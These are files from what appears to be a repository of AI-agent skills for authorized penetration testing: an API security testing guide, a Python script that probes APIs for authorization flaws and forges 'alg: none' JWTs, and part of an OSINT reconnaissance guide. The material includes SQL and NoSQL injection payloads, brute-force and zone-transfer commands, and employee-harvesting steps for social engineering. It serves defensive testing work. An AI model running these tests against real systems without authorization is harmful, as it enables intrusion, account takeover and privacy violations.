

===== FILE: skills/conducting-api-security-testing/SKILL.md =====
---
name: conducting-api-security-testing
description: 'Conducts security testing of REST, GraphQL, and gRPC APIs to identify
  vulnerabilities in authentication, authorization, rate limiting, input validation,
  and business logic. The tester uses the OWASP API Security Top 10 as the testing
  framework, combining Burp Suite interception with Postman collections and custom
  scripts to test endpoint security at every privilege level. Activates for requests
  involving API security testing, REST API pentest, GraphQL security assessment, or
  API vulnerability testing.

  '
domain: cybersecurity
subdomain: penetration-testing
tags:
- API-security
- OWASP-API-Top10
- REST
- GraphQL
- authorization-testing
version: 1.0.0
author: mahipal
license: Apache-2.0
nist_csf:
- ID.RA-01
- ID.RA-06
- GV.OV-02
- DE.AE-07
mitre_attack:
- T1190
- T1213
- T1552.001
- T1078
- T1071.001
---
# Conducting API Security Testing

## When to Use

- Testing API endpoints for authorization flaws, injection vulnerabilities, and business logic bypasses
- Assessing the security of microservices architecture where APIs are the primary communication method
- Validating that API gateway protections (rate limiting, authentication, input validation) are properly enforced
- Testing third-party API integrations for data exposure and insecure configurations
- Evaluating GraphQL APIs for introspection disclosure, query complexity attacks, and authorization bypasses

**Do not use** against APIs without written authorization, for load testing or denial-of-service testing unless explicitly scoped, or for testing production APIs that process real financial transactions without safeguards.

## Prerequisites

- API documentation (OpenAPI/Swagger, GraphQL schema, Postman collection) or application access to reverse-engineer the API
- Burp Suite Professional configured to intercept API traffic with JSON/XML content type handling
- Postman or Insomnia for organizing and replaying API requests across different authentication contexts
- Valid API tokens or credentials at multiple privilege levels (unauthenticated, standard user, admin)
- Target API base URL and version information

## Workflow

### Step 1: API Discovery and Documentation

Map the complete API attack surface:

- **Import API documentation**: Load OpenAPI/Swagger specs into Postman or Burp Suite to catalog all endpoints, methods, parameters, and authentication requirements
- **Reverse-engineer undocumented APIs**: Proxy the mobile app or web frontend through Burp Suite and exercise all features to capture API calls. Export the Burp sitemap as the baseline endpoint inventory.
- **GraphQL introspection**: Send an introspection query to discover the full schema:
  ```json
  {"query": "{__schema{types{name,fields{name,args{name,type{name}}}}}}"}
  ```
- **Endpoint enumeration**: Fuzz for hidden API versions (`/api/v1/`, `/api/v2/`, `/api/internal/`), debug endpoints (`/api/debug`, `/api/health`, `/api/metrics`), and administrative endpoints
- **Document authentication mechanisms**: Identify if the API uses API keys, OAuth 2.0 Bearer tokens, JWT, session cookies, or mutual TLS

### Step 2: Authentication and Token Testing

Test authentication mechanisms for weaknesses:

- **JWT analysis**: Decode the JWT and inspect claims (sub, exp, iss, aud, role). Test:
  - Algorithm confusion: Change `alg` to `none` and remove the signature
  - Key confusion: Change `alg` from RS256 to HS256 and sign with the public key
  - Weak secret: Brute-force the HMAC secret with `hashcat -m 16500 jwt.txt wordlist.txt`
  - Token expiration: Verify tokens expire and cannot be used after expiration
  - Claim tampering: Modify role, userId, or permission claims and re-sign
- **OAuth 2.0 testing**: Check for redirect_uri manipulation, authorization code reuse, token leakage in Referer headers, and missing state parameter (CSRF)
- **API key security**: Test if API keys are validated per-endpoint, if revoked keys are immediately rejected, and if keys in query strings appear in access logs or analytics

### Step 3: Authorization Testing (BOLA/BFLA)

Test for Broken Object Level Authorization (BOLA) and Broken Function Level Authorization (BFLA):

- **BOLA (IDOR) testing**: For every endpoint that returns user-specific data, replace the object identifier with another user's identifier:
  - `GET /api/users/123/orders` -> `GET /api/users/456/orders`
  - Test with numeric IDs, UUIDs, usernames, and email addresses
  - Automate with Burp Autorize extension: configure it with two sessions (attacker and victim) and replay all requests
- **BFLA testing**: Using a low-privilege token, attempt to access administrative endpoints:
  - `DELETE /api/users/456` (admin-only delete)
  - `PUT /api/users/456/role` (role modification)
  - `GET /api/admin/dashboard` (admin panel data)
- **Mass assignment**: Send additional JSON properties not shown in the documentation:
  ```json
  PUT /api/users/123
  {"name": "Test", "role": "admin", "isVerified": true, "balance": 99999}
  ```
- **HTTP method testing**: If GET works on an endpoint, try PUT, PATCH, DELETE, and OPTIONS to discover unprotected methods

### Step 4: Input Validation and Injection Testing

Test API inputs for injection and validation flaws:

- **SQL injection in API parameters**: Test all parameters (path, query, body, headers) with SQL injection payloads. JSON APIs are often overlooked: `{"username": "admin' OR 1=1--", "password": "test"}`
- **NoSQL injection**: For MongoDB backends, test with operator injection: `{"username": {"$gt": ""}, "password": {"$gt": ""}}`
- **SSRF via API**: Test any parameter that accepts URLs (webhook URLs, avatar URLs, import endpoints) with internal addresses and cloud metadata endpoints
- **GraphQL-specific injection**: Test for query depth attacks, alias-based batching for brute force, and field suggestion enumeration
- **XXE in XML APIs**: Submit XML content with external entity declarations to API endpoints that accept XML
- **Rate limiting validation**: Send 100+ rapid requests to authentication endpoints, password reset, and OTP verification to test for brute force protection

### Step 5: Data Exposure and Response Analysis

Check for excessive data exposure in API responses:

- **Verbose responses**: Compare the data returned in API responses with what the UI displays. APIs often return more fields than needed (internal IDs, creation timestamps, email addresses of other users, role information).
- **Error message analysis**: Trigger errors by sending malformed input, invalid tokens, and non-existent resources. Check if error messages reveal stack traces, database queries, internal paths, or technology details.
- **Pagination and enumeration**: Test if enumeration is possible by iterating through paginated responses (`/api/users?page=1`, `page=2`, etc.) to extract all records
- **GraphQL data exposure**: Query for fields not intended for the current user's role. Test nested queries that traverse relationships to access unauthorized data.
- **Debug endpoints**: Check `/api/debug`, `/api/status`, `/metrics`, `/health`, `/.env`, `/api/swagger.json` for exposed internal information

## Key Concepts

| Term | Definition |
|------|------------|
| **BOLA** | Broken Object Level Authorization (OWASP API #1); failure to verify that the requesting user is authorized to access a specific object, enabling IDOR attacks |
| **BFLA** | Broken Function Level Authorization (OWASP API #5); failure to restrict administrative or privileged API functions from being accessed by lower-privilege users |
| **Mass Assignment** | A vulnerability where the API binds client-provided data to internal object properties without filtering, allowing attackers to modify fields they should not have access to |
| **GraphQL Introspection** | A built-in GraphQL feature that exposes the complete API schema including all types, fields, and relationships; should be disabled in production |
| **JWT** | JSON Web Token; a self-contained token format used for API authentication containing claims signed with a secret or key pair |
| **Rate Limiting** | Controls that restrict the number of API requests a client can make within a time window, preventing brute force, enumeration, and abuse |

## Tools & Systems

- **Burp Suite Professional**: HTTP proxy for intercepting, modifying, and replaying API requests with extensions like Autorize for automated authorization testing
- **Postman**: API development platform used for organizing endpoint collections, scripting tests, and comparing responses across authentication contexts
- **GraphQL Voyager**: Visual tool for exploring GraphQL schemas obtained through introspection queries
- **jwt.io / jwt_tool**: Tools for decoding, analyzing, and tampering with JWT tokens to test authentication bypasses
- **Nuclei**: Template-based scanner with API-specific templates for detecting common misconfigurations and known vulnerabilities

## Common Scenarios

### Scenario: API Security Assessment for a Fintech Mobile Application

**Context**: A fintech startup has a mobile banking application with a REST API backend. The API handles account management, fund transfers, bill payments, and transaction history. The tester has Swagger documentation and accounts at user and admin levels.

**Approach**:
1. Import Swagger spec into Postman, generating 87 endpoint collections across 12 controllers
2. Discover BOLA on `/api/v1/accounts/{accountId}/transactions` allowing any authenticated user to view any account's transaction history
3. Find mass assignment on the user update endpoint where adding `"dailyTransferLimit": 999999` bypasses the configured transfer limit
4. Identify that the fund transfer endpoint lacks rate limiting, allowing unlimited transfer attempts without throttling
5. Discover that JWT tokens have a 30-day expiration with no refresh token rotation, enabling long-lived session hijacking
6. Find that the admin endpoint `/api/v1/admin/users` is accessible with a standard user token (BFLA)
7. Report all findings with CVSS scores and specific API code-level remediation guidance

**Pitfalls**:
- Testing only the endpoints documented in Swagger and missing undocumented or deprecated API versions
- Not testing the same endpoint with tokens from every privilege level to detect authorization bypasses
- Ignoring response body analysis for excessive data exposure when the UI only shows a subset of returned fields
- Failing to test for mass assignment by only sending fields shown in the documentation

## Output Format

```
## Finding: Broken Object Level Authorization in Transaction History API

**ID**: API-001
**Severity**: Critical (CVSS 9.1)
**Affected Endpoint**: GET /api/v1/accounts/{accountId}/transactions
**OWASP API Category**: API1:2023 - Broken Object Level Authorization

**Description**:
The transaction history endpoint returns all transactions for the specified
account without verifying that the authenticated user owns the account. Any
authenticated user can view the complete transaction history of any account
by substituting the accountId path parameter.

**Proof of Concept**:
1. Authenticate as User A (account ID: ACC-10045)
2. Request: GET /api/v1/accounts/ACC-10046/transactions
   Authorization: Bearer <User_A_token>
3. Response: 200 OK with User B's full transaction history

**Impact**:
Any authenticated user can view the complete financial transaction history of
all 45,000 customer accounts, including amounts, dates, recipients, and
transaction descriptions.

**Remediation**:
Implement server-side authorization check that verifies the authenticated user
owns the requested account before returning data:
  const account = await Account.findById(accountId);
  if (account.userId !== req.user.id) return res.status(403).json({error: "Forbidden"});
```

===== END FILE =====


===== FILE: skills/conducting-api-security-testing/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/conducting-api-security-testing/references/api-reference.md =====
# API Reference: API Security Testing Agent

## Overview

Tests REST and GraphQL APIs for OWASP API Security Top 10 vulnerabilities including BOLA, BFLA, mass assignment, rate limiting, JWT bypass, and GraphQL introspection disclosure. For authorized penetration testing only.

## Dependencies

| Package | Version | Purpose |
|---------|---------|---------|
| requests | >=2.28 | HTTP requests to target APIs |

## CLI Usage

```bash
python agent.py --base-url https://api.target.com --token <jwt> \
  --low-priv-token <jwt> --graphql --output report.json
```

## Arguments

| Argument | Required | Description |
|----------|----------|-------------|
| `--base-url` | Yes | Target API base URL |
| `--token` | No | Auth bearer token for authenticated testing |
| `--low-priv-token` | No | Low-privilege token for BFLA testing |
| `--login-endpoint` | No | Login endpoint for rate limiting test (default: `/api/auth/login`) |
| `--graphql` | No | Test GraphQL introspection disclosure |
| `--output` | No | Output file (default: `api_security_report.json`) |

## Key Functions

### `test_bola(base_url, endpoint_template, id_field, valid_id, other_id, auth_token)`
Tests Broken Object Level Authorization by accessing another user's resource with own credentials.

### `test_bfla(base_url, admin_endpoints, low_priv_token)`
Tests admin endpoints with low-privilege tokens using GET, POST, DELETE methods.

### `test_mass_assignment(base_url, endpoint, auth_token, extra_fields)`
Sends undocumented fields (role, isAdmin) to update endpoints and verifies if they persist.

### `test_rate_limiting(base_url, endpoint, num_requests)`
Sends rapid requests to detect absence of rate limiting on authentication endpoints.

### `test_jwt_none_algorithm(base_url, endpoint, jwt_token)`
Forges JWT with `alg: none` to test for algorithm confusion vulnerabilities.

### `test_graphql_introspection(base_url, graphql_endpoint)`
Sends introspection query to check if full schema disclosure is enabled.

### `test_excessive_data_exposure(base_url, endpoint, auth_token, expected_fields)`
Compares API response fields against expected fields to identify over-exposure.

## OWASP API Top 10 Coverage

| OWASP ID | Vulnerability | Function |
|----------|--------------|----------|
| API1:2023 | Broken Object Level Authorization | `test_bola` |
| API3:2023 | Excessive Data Exposure | `test_excessive_data_exposure` |
| API4:2023 | Unrestricted Resource Consumption | `test_rate_limiting` |
| API5:2023 | Broken Function Level Authorization | `test_bfla` |
| API6:2023 | Mass Assignment | `test_mass_assignment` |

===== END FILE =====


===== FILE: skills/conducting-api-security-testing/scripts/agent.py =====
#!/usr/bin/env python3
# For authorized penetration testing and lab environments only
"""API Security Testing Agent - Tests REST/GraphQL APIs for OWASP API Top 10 vulnerabilities."""

import json
import logging
import argparse
from datetime import datetime
from urllib.parse import urljoin

import requests

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)


def test_bola(base_url, endpoint_template, id_field, valid_id, other_id, auth_token):
    """Test for Broken Object Level Authorization (BOLA/IDOR)."""
    headers = {"Authorization": f"Bearer {auth_token}"}
    own_resp = requests.get(
        urljoin(base_url, endpoint_template.replace(f"{{{id_field}}}", str(valid_id))),
        headers=headers, timeout=10,
    )
    other_resp = requests.get(
        urljoin(base_url, endpoint_template.replace(f"{{{id_field}}}", str(other_id))),
        headers=headers, timeout=10,
    )
    vulnerable = other_resp.status_code == 200 and len(other_resp.content) > 50
    result = {
        "test": "BOLA (API1:2023)",
        "endpoint": endpoint_template,
        "own_status": own_resp.status_code,
        "other_status": other_resp.status_code,
        "vulnerable": vulnerable,
    }
    if vulnerable:
        logger.warning("BOLA vulnerability found: %s", endpoint_template)
    return result


def test_bfla(base_url, admin_endpoints, low_priv_token):
    """Test for Broken Function Level Authorization (BFLA)."""
    headers = {"Authorization": f"Bearer {low_priv_token}"}
    results = []
    for endpoint in admin_endpoints:
        for method in ["GET", "POST", "DELETE"]:
            try:
                resp = requests.request(
                    method, urljoin(base_url, endpoint),
                    headers=headers, timeout=10,
                )
                vulnerable = resp.status_code in (200, 201, 204)
                results.append({
                    "test": "BFLA (API5:2023)",
                    "endpoint": endpoint,
                    "method": method,
                    "status": resp.status_code,
                    "vulnerable": vulnerable,
                })
                if vulnerable:
                    logger.warning("BFLA: %s %s accessible with low-priv token", method, endpoint)
            except requests.RequestException:
                continue
    return results


def test_mass_assignment(base_url, endpoint, auth_token, extra_fields):
    """Test for mass assignment vulnerability."""
    headers = {"Authorization": f"Bearer {auth_token}", "Content-Type": "application/json"}
    resp = requests.put(
        urljoin(base_url, endpoint),
        headers=headers, json=extra_fields, timeout=10,
    )
    verify = requests.get(urljoin(base_url, endpoint), headers=headers, timeout=10)
    verify_data = verify.json() if verify.status_code == 200 else {}

    vulnerable = False
    for key, value in extra_fields.items():
        if key in verify_data and verify_data[key] == value:
            vulnerable = True
            break

    return {
        "test": "Mass Assignment (API6:2023)",
        "endpoint": endpoint,
        "injected_fields": list(extra_fields.keys()),
        "vulnerable": vulnerable,
        "update_status": resp.status_code,
    }


def test_rate_limiting(base_url, endpoint, num_requests=100):
    """Test rate limiting on sensitive endpoints."""
    statuses = []
    for i in range(num_requests):
        try:
            resp = requests.post(
                urljoin(base_url, endpoint),
                json={"username": f"test{i}", "password": "wrong"},
                timeout=5,
            )
            statuses.append(resp.status_code)
            if resp.status_code == 429:
                logger.info("Rate limiting triggered after %d requests", i + 1)
                return {
                    "test": "Rate Limiting (API4:2023)",
                    "endpoint": endpoint,
                    "requests_sent": i + 1,
                    "rate_limited": True,
                    "vulnerable": False,
                }
        except requests.RequestException:
            break

    return {
        "test": "Rate Limiting (API4:2023)",
        "endpoint": endpoint,
        "requests_sent": len(statuses),
        "rate_limited": False,
        "vulnerable": True,
    }


def test_jwt_none_algorithm(base_url, endpoint, jwt_token):
    """Test for JWT 'none' algorithm bypass."""
    import base64
    parts = jwt_token.split(".")
    if len(parts) != 3:
        return {"test": "JWT None Algorithm", "vulnerable": False, "error": "Invalid JWT"}

    header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
    header["alg"] = "none"
    new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
    forged_token = f"{new_header}.{parts[1]}."

    resp = requests.get(
        urljoin(base_url, endpoint),
        headers={"Authorization": f"Bearer {forged_token}"},
        timeout=10,
    )
    vulnerable = resp.status_code == 200
    return {
        "test": "JWT None Algorithm",
        "endpoint": endpoint,
        "forged_status": resp.status_code,
        "vulnerable": vulnerable,
    }


def test_graphql_introspection(base_url, graphql_endpoint="/graphql"):
    """Test if GraphQL introspection is enabled."""
    query = {"query": "{__schema{types{name,fields{name,args{name,type{name}}}}}}"}
    resp = requests.post(
        urljoin(base_url, graphql_endpoint),
        json=query, timeout=10,
    )
    has_schema = "types" in resp.text if resp.status_code == 200 else False
    return {
        "test": "GraphQL Introspection Disclosure",
        "endpoint": graphql_endpoint,
        "status": resp.status_code,
        "introspection_enabled": has_schema,
        "vulnerable": has_schema,
    }


def test_excessive_data_exposure(base_url, endpoint, auth_token, expected_fields):
    """Test for excessive data exposure in API responses."""
    headers = {"Authorization": f"Bearer {auth_token}"}
    resp = requests.get(urljoin(base_url, endpoint), headers=headers, timeout=10)
    if resp.status_code != 200:
        return {"test": "Excessive Data Exposure", "endpoint": endpoint, "vulnerable": False}
    data = resp.json()
    extra_fields = [k for k in data.keys() if k not in expected_fields] if isinstance(data, dict) else []
    return {
        "test": "Excessive Data Exposure (API3:2023)",
        "endpoint": endpoint,
        "expected_fields": expected_fields,
        "extra_fields": extra_fields,
        "vulnerable": len(extra_fields) > 0,
    }


def generate_report(findings):
    """Generate API security testing report."""
    critical = [f for f in findings if f.get("vulnerable")]
    report = {
        "timestamp": datetime.utcnow().isoformat(),
        "total_tests": len(findings),
        "vulnerabilities_found": len(critical),
        "findings": findings,
    }
    logger.info("Report: %d tests, %d vulnerabilities", len(findings), len(critical))
    return report


def main():
    parser = argparse.ArgumentParser(description="API Security Testing Agent")
    parser.add_argument("--base-url", required=True, help="API base URL")
    parser.add_argument("--token", help="Auth bearer token")
    parser.add_argument("--low-priv-token", help="Low-privilege bearer token for BFLA testing")
    parser.add_argument("--login-endpoint", default="/api/auth/login", help="Login endpoint for rate limit test")
    parser.add_argument("--graphql", action="store_true", help="Test GraphQL introspection")
    parser.add_argument("--output", default="api_security_report.json")
    args = parser.parse_args()

    findings = []

    findings.append(test_rate_limiting(args.base_url, args.login_endpoint, 50))

    if args.graphql:
        findings.append(test_graphql_introspection(args.base_url))

    if args.low_priv_token:
        admin_eps = ["/api/admin/users", "/api/admin/settings", "/api/admin/dashboard"]
        findings.extend(test_bfla(args.base_url, admin_eps, args.low_priv_token))

    if args.token:
        findings.append(test_jwt_none_algorithm(args.base_url, "/api/profile", args.token))

    report = generate_report(findings)
    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)
    logger.info("Report saved to %s", args.output)


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/conducting-external-reconnaissance-with-osint/SKILL.md =====
---
name: conducting-external-reconnaissance-with-osint
description: Conduct external recon using OSINT techniques to map an organization's external attack surface without touching target systems, gathering DNS records, certificate transparency logs, search results, social media, code repositories, and breach databases into a target profile. Use for the passive info-gathering phase of a pentest, external footprinting, or collecting employee/email intel for a social engineering campaign.
domain: cybersecurity
subdomain: penetration-testing
tags:
- OSINT
- reconnaissance
- attack-surface
- footprinting
- passive-recon
version: 1.0.0
author: mahipal
license: Apache-2.0
nist_csf:
- ID.RA-01
- ID.RA-06
- GV.OV-02
- DE.AE-07
mitre_attack:
- T1595
- T1592
- T1589
- T1590
---
# Conducting External Reconnaissance with OSINT

## When to Use

- Performing the initial reconnaissance phase of a penetration test to gather intelligence before active scanning
- Mapping an organization's external attack surface to identify unknown or shadow IT assets
- Collecting employee information, email formats, and organizational structure for social engineering campaigns
- Identifying exposed credentials, leaked data, or sensitive documents published on the internet
- Scoping the breadth of an organization's digital footprint prior to a red team engagement

**Do not use** for stalking, harassment, or unauthorized surveillance of individuals. OSINT gathering must be conducted within the scope of an authorized engagement and comply with applicable privacy laws (GDPR, CCPA).

## Prerequisites

- Written authorization to perform reconnaissance against the target organization
- Dedicated research workstation with a VPN or Tor for anonymized queries when required
- OSINT framework tools installed: Amass, theHarvester, Shodan CLI, Recon-ng, SpiderFoot
- API keys for Shodan, Censys, SecurityTrails, Hunter.io, VirusTotal, and GitHub for enhanced results
- Disposable email accounts for accessing services that require registration during research

## Workflow

### Step 1: Domain and DNS Enumeration

Enumerate all domains, subdomains, and DNS records associated with the target:

- **Root domain identification**: Start with the primary domain and identify all related domains through reverse WHOIS lookups on registrant name, email, and organization using `whoxy.com` or `domaintools.com`
- **Subdomain enumeration**: Run multiple tools for comprehensive coverage:
  - `amass enum -passive -d target.com -o amass_subs.txt` for passive subdomain discovery from 40+ data sources
  - `subfinder -d target.com -all -o subfinder_subs.txt` for fast passive enumeration
  - `crt.sh` certificate transparency log queries: `curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u`
- **DNS record analysis**: Query for all record types: `dig target.com ANY`, check for SPF, DKIM, DMARC records that reveal email infrastructure, and enumerate MX records to identify email providers
- **Zone transfer attempt**: `dig axfr @ns1.target.com target.com` to check for misconfigured DNS servers
- **Consolidate results**: Merge, deduplicate, and resolve all discovered subdomains to IP addresses. Map IP addresses to ASN and hosting providers.

### Step 2: Infrastructure and Service Discovery

Identify internet-facing infrastructure without directly scanning target systems:

- **Shodan**: `shodan search "ssl.cert.subject.cn:target.com"` to find all internet-facing services with TLS certificates for the target domain. Also search by organization name and IP ranges.
- **Censys**: Search for target's IP ranges and TLS certificates to identify services, technologies, and potential vulnerabilities indexed from internet-wide scanning
- **Cloud asset discovery**: Check for S3 buckets (`target-com`, `target-backup`, `target-dev`), Azure Blob storage (`target.blob.core.windows.net`), and GCP storage using tools like `cloud_enum`
- **WAF and CDN identification**: Use `wafw00f target.com` to identify web application firewalls and CDN providers that may mask the origin server IP
- **Historical data**: Use Wayback Machine (`web.archive.org`) to find removed pages, old application versions, and forgotten endpoints

### Step 3: Email and Personnel Intelligence

Gather employee information and email addresses for social engineering preparation:

- **Email harvesting**: `theHarvester -d target.com -b all -f harvest_results.html` to collect emails from search engines, LinkedIn, and data sources
- **Email format identification**: Use `hunter.io` to determine the email format (first.last, flast, firstl) and verify deliverability
- **LinkedIn reconnaissance**: Identify employees by department, particularly IT administrators, security team members, and executives. Note technologies mentioned in job postings and employee profiles.
- **Organizational chart**: Build an org chart from LinkedIn data to understand reporting structures, identify key personnel, and map departments
- **Social media analysis**: Review employee social media profiles for information about internal tools, technologies, office locations, badge photos, and security practices
- **Job postings**: Analyze current and historical job postings on the company career page and job boards for technology stack details, tools, and infrastructure information

### Step 4: Credential and Data Leak Analysis

Search for exposed credentials and sensitive data:

- **Breach databases**: Check `haveibeenpwned.com` API for breached email addresses associated with the target domain
- **Paste sites**: Search Pastebin, GitHub Gists, and similar paste sites for leaked credentials, configuration files, or internal documents
- **Code repositories**: Search GitHub, GitLab, and Bitbucket for:
  - `org:target "password"`, `org:target "api_key"`, `org:target "secret"`
  - Use `trufflehog` or `gitleaks` for automated secret scanning across the target's public repositories
- **Document metadata**: Download publicly available documents (PDF, DOCX, XLSX) from the target website and extract metadata using `exiftool` to reveal internal usernames, software versions, printer names, and file paths
- **Google dorking**: Use targeted search operators:
  - `site:target.com filetype:pdf` for public documents
  - `site:target.com inurl:admin` for admin panels
  - `site:target.com "index of /"` for directory listings
  - `site:pastebin.com "target.com"` for paste site mentions

### Step 5: Technology Stack Profiling

Identify the technologies, frameworks, and services used by the target:

- **Web technology fingerprinting**: Use `whatweb target.com` or Wappalyzer browser extension to identify CMS, frameworks, JavaScript libraries, analytics, and server software
- **SSL/TLS analysis**: `sslyze target.com` or `testssl.sh target.com` to identify cipher suites, protocol versions, certificate details, and cryptographic weaknesses
- **JavaScript analysis**: Download and review JavaScript files for framework identifiers, API endpoints, internal hostnames, and version strings
- **DNS-based service identification**: Review TXT records for service providers (e.g., `v=spf1 include:_spf.google.com` indicates Google Workspace, `MS=msXXXXXX` indicates Microsoft 365)
- **Mobile app analysis**: Download the target's mobile applications from app stores and analyze with `apktool` (Android) or `frida` for hardcoded URLs, API endpoints, and embedded credentials

## Key Concepts

| Term | Definition |
|------|------------|
| **OSINT** | Open Source Intelligence; intelligence collected from publicly available sources including websites, social media, public records, and government data |
